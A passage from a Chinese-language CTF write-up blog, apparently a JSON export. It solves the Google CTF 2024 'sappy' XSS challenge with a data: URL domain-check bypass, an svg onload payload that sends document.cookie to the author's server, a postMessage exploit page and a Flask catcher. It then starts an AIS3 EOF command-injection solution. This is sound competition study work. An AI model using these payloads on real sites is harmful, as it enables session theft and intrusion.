style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;floating-point\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0.1 + 0.2 != 0.3\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;html\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Because of the underyling floating point arithmetic, in JavaScript 0.1+0.2 is \u0026lt;b\u0026gt;not\u0026lt;/b\u0026gt; equal to 0.3!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;document-all\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;document.all\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;html\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;document.all is an instance of Object, you can check it. But then: \u0026lt;code\u0026gt;typeof document.all === \u0026#39;undefined\u0026#39;\u0026lt;/code\u0026gt;!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;plus-operator\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;plus operator\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;html\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Here\u0026#39;s a little riddle: what is the result of \u0026lt;code\u0026gt;[]+{}\u0026lt;/code\u0026gt;? It\u0026#39;s \u0026lt;code\u0026gt;\\\u0026#34;[object Object]\\\u0026#34;\u0026lt;/code\u0026gt;!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;no-lowercase\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no lowercase characters\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;html\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Do you know it\u0026#39;s possible to call arbitrary JS code without using lowercase characters? Here I am calling \u0026lt;code\u0026gt;console.log(1)\u0026lt;/code\u0026gt;: \u0026lt;code\u0026gt;[][\u0026#39;\\\\143\\\\157\\\\156\\\\163\\\\164\\\\162\\\\165\\\\143\\\\164\\\\157\\\\162\u0026#39;][\u0026#39;\\\\143\\\\157\\\\156\\\\163\\\\164\\\\162\\\\165\\\\143\\\\164\\\\157\\\\162\u0026#39;](\u0026#39;\\\\143\\\\157\\\\156\\\\163\\\\157\\\\154\\\\145\\\\56\\\\154\\\\157\\\\147\\\\50\\\\61\\\\51\u0026#39;)()    \u0026lt;/code\u0026gt;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003esap.js\u003c/code\u003e 拿到 page info 以後會直接用 \u003ccode\u003einnerHTML\u003c/code\u003e 把 \u003ccode\u003ejson.html\u003c/code\u003e 放進 \u003ccode\u003eoutput\u003c/code\u003e 裡，這邊會產生 xss\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehtml\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;string\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#a6e22e\"\u003eoutput\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003einnerHTML\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ehtml\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e所以我們的目標是要自己架一個網站裡面會嵌入目標網站的 \u003ccode\u003esap.html\u003c/code\u003e 然後再操作 page info url 去取得有 xss payload 的 page info 讓 \u003ccode\u003esap.html\u003c/code\u003e 去載入造成 xss，再將自己架的網頁的 url 送給目標的 bot 取得 cookie。\u003c/p\u003e\n\u003ch3 id=\"解題-2\"\u003e解題\u003c/h3\u003e\n\u003cp\u003e這題的重點是要如何繞 \u003ccode\u003eif (h.getDomain() !== \u0026quot;sappy-web.2024.ctfcompetition.com\u0026quot;)\u003c/code\u003e 基本上除非 \u003ccode\u003egoog.Uri\u003c/code\u003e 有洞，否則不太可能繞過，但是他沒有限制 \u003ccode\u003escheme\u003c/code\u003e 只能用 http 或 https，而 fetch 是可以塞 data scheme 的，所以我就可以構造以下 url\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003edata://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e其中 \u003ccode\u003edata://sappy-web.2024.ctfcompetition.com/\u003c/code\u003e 可以保證 \u003ccode\u003egetDomain\u003c/code\u003e 是 \u003ccode\u003esappy-web.2024.ctfcompetition.com\u003c/code\u003e 然後 \u003ccode\u003e;base64,\u003c/code\u003e 表示後面的東西要過 base64 decode 接著後面的 base64 就是我們 payload 的 json\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;html\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026lt;svg\u0026gt;\u0026lt;svg/onload=\u0026#39;window.location=\\\u0026#34;https://vpn.chummydns.com:20000/xss\\\u0026#34;+document.cookie\u0026#39;\u0026gt;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最後的 \u003ccode\u003e#\u003c/code\u003e 則是讓後面的 \u003ccode\u003e/sap/\u0026lt;page id\u0026gt;\u003c/code\u003e 變成 hash tag 來忽略掉。\u003c/p\u003e\n\u003cp\u003e這樣就能成功 xss 了。\u003c/p\u003e\n\u003cp\u003e但是還有一個問題是因為 \u003ccode\u003eiframe\u003c/code\u003e 內的網站是不會帶 cookie 的，所以要找別的方法載入網站並控制，而這邊選擇用 \u003ccode\u003ewindow.open\u003c/code\u003e 來解決。\u003c/p\u003e\n\u003ch3 id=\"exploit-2\"\u003eexploit\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e flask \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e Flask,request,redirect,Response,render_template\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e json\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Flask(__name__)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.route\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e,methods\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eroot\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;index.html\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.route\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/\u0026lt;path:data\u0026gt;\u0026#39;\u003c/span\u003e,methods\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehack\u003c/span\u003e(data\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hack\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e __name__ \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;__main__\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    app\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(host\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;::\u0026#34;\u003c/span\u003e, port\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e20000\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://sappy-web.2024.ctfcompetition.com\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ewin\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e window.\u003cspan style=\"color:#a6e22e\"\u003eopen\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/sap.html`\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehack\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ewin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epostMessage\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estringify\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003emethod\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;initialize\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003ehost\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }), \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ewin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epostMessage\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estringify\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003emethod\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;render\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003epage\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;xss\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }), \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eloadpage\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esetTimeout\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehack\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1000\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;/\u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag-2\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4fd1f3cf-3790-4762-99d9-39a45298192a\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f87e4ed7-8eab-4618-8e48-df0fa4731c66\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eCTF{parsing_urls_is_always_super_tricky}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"戰隊其他人的-write-up\"\u003e戰隊其他人的 write up\u003c/h2\u003e\n\u003cp\u003e待補\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/google-ctf-2024/","title":"Google CTF 2024 WriteUp"},{"content":"\u003ch2 id=\"misc\"\u003eMisc\u003c/h2\u003e\n\u003ch3 id=\"welcome\"\u003eWelcome\u003c/h3\u003e\n\u003ch4 id=\"題目\"\u003e題目\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a74a45e2-8fbb-42d3-bcbc-0b8c488789c5\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ac494f35-2f7e-4ccd-b244-5f049e7c83ea\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{W3lc0mE_T0_A1S5s_EOF_2o24}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"dns-lookup-tool-final\"\u003eDNS Lookup Tool: Final\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f415e3ed-1266-43e2-88fb-a1e6681cee27\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"webpage\"\u003eWebpage\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/41cfd043-3fe8-4141-81d3-f057901a04bc\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e正常\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a81ed269-8b81-4b17-9c49-06cd95765705\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e不存在 domain\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8c1547f0-025c-4875-aafd-3315a68e9d46\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e使用違規字元\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2dbd2b38-8128-4883-95cd-aa7f50ee911f\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e讀 code 找到 blacklist\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/68686376-29a6-4bbc-bca0-3c63da797b1f\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e發現 \u003ccode\u003e$()\u003c/code\u003e 沒檔，測一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/525b06b2-d309-47a2-976d-70058bd30fb4\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e過了\u003c/p\u003e\n\u003ch4 id=\"exploit\"\u003eexploit\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env python3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e flask \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e Flask,request,redirect,Response\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Flask(__name__)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.route\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e,methods\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eroot\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estream\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.route\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/\u0026lt;path:data\u0026gt;\u0026#39;\u003c/span\u003e,methods\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erun\u003c/span\u003e(data):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e __name__ \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;__main__\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    app\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(host\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;::\u0026#34;\u003c/span\u003e, port\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"payload\"\u003epayload\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre 